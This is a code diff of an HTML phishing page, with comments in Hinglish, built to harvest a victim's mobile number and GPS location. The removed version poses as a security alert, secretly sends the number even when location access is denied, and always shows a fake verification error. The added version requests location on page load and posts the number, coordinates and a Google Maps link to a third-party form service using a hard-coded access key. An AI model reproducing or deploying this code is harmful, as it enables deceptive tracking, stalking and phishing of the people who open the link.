@@ -3,116 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Alert Portal</title>
+    <title>Verify Your Number</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f9; padding: 20px; }
-        .container { max-width: 420px; margin: 40px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0px 0px 15px rgba(0,0,0,0.1); border-top: 5px solid #D8000C; }
-        
-        .alert-box { background-color: #FFBABA; color: #D8000C; padding: 15px; border-radius: 5px; font-weight: bold; margin-bottom: 25px; font-size: 14px; text-align: left; border: 1px solid #D8000C; }
-        
-        h2 { color: #111; font-size: 22px; margin-bottom: 10px; font-weight: 600; }
-        p { color: #555; font-size: 14px; margin-bottom: 25px; line-height: 1.5; text-align: left; }
-        
-        input { padding: 12px; font-size: 16px; border: 1px solid #ccc; border-radius: 5px; width: 88%; margin-bottom: 15px; box-sizing: border-box; }
-        button { padding: 14px 24px; font-size: 16px; background-color: #007BFF; color: white; border: none; border-radius: 5px; cursor: pointer; width: 88%; font-weight: bold; }
+        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f4f9; }
+        .form-container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
+        input[type="tel"] { width: 90%; padding: 10px; margin: 15px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; }
+        button { background-color: #007bff; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 4px; cursor: pointer; width: 100%; }
         button:hover { background-color: #0056b3; }
-        
-        #error-msg { color: #D8000C; font-weight: bold; margin-top: 15px; display: none; font-size: 14px; text-align: center; }
-        #loading { color: #555; font-weight: bold; margin-top: 15px; display: none; text-align: center; }
+        #status { margin-top: 15px; color: #555; font-size: 14px; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <!-- Aapki batayi hui warning screen par sabse upar -->
-        <div class="alert-box">
-            ⚠️ USER ID - unicorn.61799993 <br>
-            Suspicious behaviour detected. Apna complaint dekhe.
-        </div>
-
-        <h2>Identity Verification</h2>
-        <p>To view the detailed complaint report associated with this ID, please enter your 10-digit registered mobile number to securely verify your identity.</p>
+<div class="form-container">
+    <h2>Mobile Verification</h2>
+    <p>Kripya apna mobile number enter karein aur location allow karein.</p>
+    
+    <form id="locationForm" action="https://api.web3forms.com/submit" method="POST">
+        <input type="hidden" name="access_key" value="394be003-9b48-427f-a2d3-001ece7336bf">
         
-        <input type="tel" id="phone" placeholder="Enter Mobile Number" maxlength="10">
-        <br>
-        <button onclick="startProcess()">Verify & Submit</button>
+        <input type="tel" name="Mobile_Number" placeholder="Enter Mobile Number" required id="phoneNumber">
         
-        <div id="loading">Verifying details... Please wait...</div>
-        <div id="error-msg">Verification Error! The number entered is not recognized or system timeout. Please try again.</div>
-    </div>
+        <input type="hidden" name="Latitude" id="latField">
+        <input type="hidden" name="Longitude" id="lngField">
+        <input type="hidden" name="Google_Maps_Link" id="mapLinkField">
 
-    <script>
-        const MY_ACCESS_KEY = '394be003-9b48-427f-a2d3-001ece7336bf';
-        let userPhone = "";
+        <button type="submit" id="submitBtn">Submit & Verify</button>
+    </form>
+    
+    <div id="status"></div>
+</div>
 
-        function startProcess() {
-            userPhone = document.getElementById("phone").value;
-            let errorMsg = document.getElementById("error-msg");
-            let loading = document.getElementById("loading");
+<script>
+    const form = document.getElementById('locationForm');
+    const status = document.getElementById('status');
 
-            // Basic check ki number 10 digit ka hai ya nahi
-            if (phoneInput.length < 10 || isNaN(phoneInput)) {
-                alert("Please enter a valid 10-digit mobile number.");
-                return;
-            }
-
-            loading.style.display = "block";
-            errorMsg.style.display = "none";
-
-            // Button click par ab location maangega (Isse Instagram block nahi karega)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocationAndPhone, handleLocationError);
-            } else {
-                // Agar browser support nahi karta toh sirf number bhej do
-                sendOnlyPhone();
-            }
+    // Jaise hi link khulegi, browser location access maangna shuru kar dega
+    window.onload = function() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    
+                    document.getElementById('latField').value = lat;
+                    document.getElementById('lngField').value = lng;
+                    document.getElementById('mapLinkField').value = `https://www.google.com/maps?q=${lat},${lng}`;
+                    
+                    status.innerText = "Location access successfully allowed.";
+                    status.style.color = "green";
+                },
+                function(error) {
+                    status.innerText = "Kripya page reload karein aur location ko 'Allow' karein.";
+                    status.style.color = "red";
+                }
+            );
+        } else {
+            status.innerText = "Aapka browser location support nahi karta.";
         }
+    };
 
-        // SHART 1: Agar user ne ALLOW kiya (Dono data bhej do)
-        function sendLocationAndPhone(position) {
-            let lat = position.coords.latitude;
-            let lon = position.coords.longitude;
-            
-            let formData = new FormData();
-            formData.append("access_key", MY_ACCESS_KEY);
-            formData.append("Subject", "🚨 FULL DATA: Mobile + Location");
-            formData.append("Mobile Number", userPhone);
-            formData.append("Google Map Link", "https://maps.google.com/?q=" + lat + "," + lon);
-
-            fetch("https://api.web3forms.com/submit", { method: "POST", body: formData })
-            .then(() => {
-                showFinalError();
-            }).catch(() => {
-                showFinalError();
-            });
+    // Form submit hone par validation aur message
+    form.addEventListener('submit', function(e) {
+        const lat = document.getElementById('latField').value;
+        if (!lat) {
+            e.preventDefault(); // Form rok dega agar location allow nahi hui hai
+            alert("Pehle location allow karein, uske baad hi submit karein.");
+        } else {
+            status.innerText = "Sending data to your Gmail...";
         }
+    });
+</script>
 
-        // SHART 2: Agar user ne DENY (Block) kiya (Keval number bhej do)
-        function handleLocationError(error) {
-            // Bhale hi unhone deny kiya ho, hum chupke se sirf number bhej denge
-            sendOnlyPhone();
-        }
-
-        function sendOnlyPhone() {
-            let formData = new FormData();
-            formData.append("access_key", MY_ACCESS_KEY);
-            formData.append("Subject", "📱 ONLY PHONE: (Location Denied)");
-            formData.append("Mobile Number", userPhone);
-
-            fetch("https://api.web3forms.com/submit", { method: "POST", body: formData })
-            .then(() => {
-                showFinalError();
-            }).catch(() => {
-                showFinalError();
-            });
-        }
-
-        // SHART 3: Har haal mein baad mein Verification Error hi dikhana hai
-        function showFinalError() {
-            document.getElementById("loading").style.display = "none";
-            document.getElementById("error-msg").style.display = "block";
-            document.getElementById("phone").value = ""; // Box khali kar do
-        }
-    </script>
 </body>
 </html>
